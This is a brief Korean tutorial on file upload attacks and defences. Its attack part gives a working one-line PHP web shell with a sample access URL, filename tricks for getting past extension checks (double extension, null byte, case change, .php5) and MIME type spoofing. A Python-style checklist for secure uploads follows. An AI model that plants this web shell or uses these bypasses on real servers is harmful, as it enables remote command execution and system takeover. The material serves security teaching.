공격 예제

정상 파일: image.jpg, document.pdf

악의적 파일:

1️⃣ 웹쉘 업로드 (PHP)

<?php
  system($_GET['cmd']);
?>

# shell.php로 저장 후 업로드
# 접근: http://target.com/uploads/shell.php?cmd=whoami

2️⃣ 확장자 우회 시도

  • shell.php.jpg - 이중 확장자
  • shell.php%00.jpg - Null byte injection
  • shell.pHp - 대소문자 우회
  • shell.php5 - 대체 확장자

3️⃣ MIME 타입 위조

# 악성 PHP 파일의 헤더를 image/jpeg로 위조
# Content-Type: image/jpeg 설정

💡 안전한 파일 업로드 구현

# 1. 파일 크기 제한
max_size = 5 * 1024 * 1024 # 5MB

# 2. 확장자 화이트리스트
allowed_ext = ['.jpg', '.png', '.pdf']

# 3. MIME 타입 검증
allowed_mimes = ['image/jpeg', 'image/png']

# 4. 파일명 무작위화
safe_name = f"{uuid.uuid4()}.jpg"

# 5. 웹 루트 외부에 저장
# 6. 실행 권한 제거

실제 공격 시나리오

  • 웹쉘 업로드 → 시스템 명령어 실행
  • 악성 스크립트 업로드 → 다른 사용자 감염
  • 대용량 파일 업로드 → 서비스 거부 공격(DoS)
  • 민감한 파일 덮어쓰기 → 설정 파일 변조
